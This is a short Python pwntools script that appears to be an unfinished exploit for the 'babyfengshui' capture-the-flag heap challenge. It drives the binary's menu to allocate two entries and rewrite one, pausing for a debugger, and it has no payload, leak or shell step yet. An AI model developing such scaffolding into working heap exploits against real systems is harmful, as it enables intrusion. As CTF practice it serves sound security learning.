from pwn import *
context(os="linux", arch="i386")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./babyfengshui"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.19.so"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("Action: ", str(idx))

def add(size, name, txt_len, txt):
	opt(0)
	sla("size of description: ", str(size))
	sla("name: ", name)
	sla("text length: ", str(txt_len))
	sa("text: ", txt)

#def del(idx):
#	opt(1)
#	sal("index: ", str(idx))

def update(idx, txt_len, txt):
	opt(3)
	sla("index: ", str(idx))
	sla("text length: ", str(txt_len))
	sa("text: ", txt)

def pwn():
	add(0x84, "111", 0x78, 'a'*0x78)
	add(0x84, "222", 0x78, 'b'*0x78)		
	getpid()
	update(0, 0x78, 'A'*0x78+'\n')

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

